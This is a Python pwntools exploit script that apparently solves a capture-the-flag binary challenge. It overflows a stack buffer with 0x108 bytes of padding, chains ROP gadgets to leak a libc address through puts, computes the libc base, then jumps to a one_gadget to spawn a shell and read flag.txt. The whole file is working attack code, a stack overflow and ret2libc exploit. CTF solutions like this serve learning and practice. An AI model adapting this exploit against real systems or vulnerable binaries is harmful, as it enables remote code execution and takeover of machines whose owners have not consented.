#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '4102'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
libc = ELF('./libc-2.27.so')
context.binary = binfile
io = remote(HOST, PORT)

# padding
pad = b'a' * 0x108

# one_gadgets
one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

# libc base address leak
rop = ROP(e)
rop.puts(e.got['__libc_start_main'])
rop.call(e.sym['main'])

payload = pad + rop.chain()

io.sendline(payload)

io.readline()

gets_addr = io.recvline()

libc_base = unpack(gets_addr.ljust(8, b'\0')) - libc.sym['__libc_start_main']

# call one_gadget

rop = ROP(e)
rop.call(pack(libc_base + one_gadgets[0]))

payload = pad + rop.chain()

io.sendline(payload)

io.sendline('echo "hello shell"')
io.recvuntil(b'hello shell\n')
io.sendline('cat flag.txt')
print(io.recvuntil(b'}').decode('utf-8', 'ignore'))
io.close()
exit()
